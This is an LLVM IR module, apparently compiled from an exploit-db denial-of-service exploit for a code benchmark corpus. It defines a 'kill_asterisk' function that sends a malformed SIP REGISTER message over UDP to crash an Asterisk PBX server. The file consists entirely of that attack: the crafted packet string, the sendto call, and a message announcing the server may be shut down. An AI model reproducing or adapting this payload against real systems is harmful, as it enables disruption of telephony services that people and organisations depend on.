; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_3407.c_kill_asterisk.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_3407.c_kill_asterisk.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.udp_session = type { i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [373 x i8] c"REGISTER              \0D\0AVia: SIP/2.0/UDP 192.168.204.130:5060;branch=z9hG4bK1d97e14f\0D\0AMax-Forwards: 70\0D\0AFrom: <sip:666@192.168.204.130>;tag=as253946cf\0D\0ATo: <sip:100@192.168.204.130>\0D\0ACall-ID: 7e64a49e5cf018231228938050e43d3b@127.0.0.1\0D\0ACSeq: 104 REGISTER\0D\0AUser-Agent: Asterisk PBX\0D\0AExpires: 120\0D\0AContact: <sip:666@192.168.204.130>\0D\0AEvent: registration\0D\0AContent-Length: 0\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"You may have well shutdown a asterisk server\0A\00", align 1
@.str.2 = private unnamed_addr constant [39 x i8] c"there was a issue sending the request\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @kill_asterisk(%struct.udp_session* %0) #0 {
  %2 = alloca %struct.udp_session*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  store %struct.udp_session* %0, %struct.udp_session** %2, align 8
  store i8* getelementptr inbounds ([373 x i8], [373 x i8]* @.str, i64 0, i64 0), i8** %4, align 8
  %5 = load %struct.udp_session*, %struct.udp_session** %2, align 8
  %6 = getelementptr inbounds %struct.udp_session, %struct.udp_session* %5, i32 0, i32 1
  %7 = load i32, i32* %6, align 4
  %8 = load i8*, i8** %4, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call i32 @strlen(i8* %9)
  %11 = load %struct.udp_session*, %struct.udp_session** %2, align 8
  %12 = getelementptr inbounds %struct.udp_session, %struct.udp_session* %11, i32 0, i32 0
  %13 = bitcast i32* %12 to %struct.sockaddr*
  %14 = call i32 @sendto(i32 %7, i8* %8, i32 %10, i32 0, %struct.sockaddr* %13, i32 4)
  store i32 %14, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %19

17:                                               ; preds = %1
  %18 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  br label %21

19:                                               ; preds = %1
  %20 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.2, i64 0, i64 0))
  br label %22

21:                                               ; preds = %17
  br label %22

22:                                               ; preds = %21, %19
  ret void
}

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
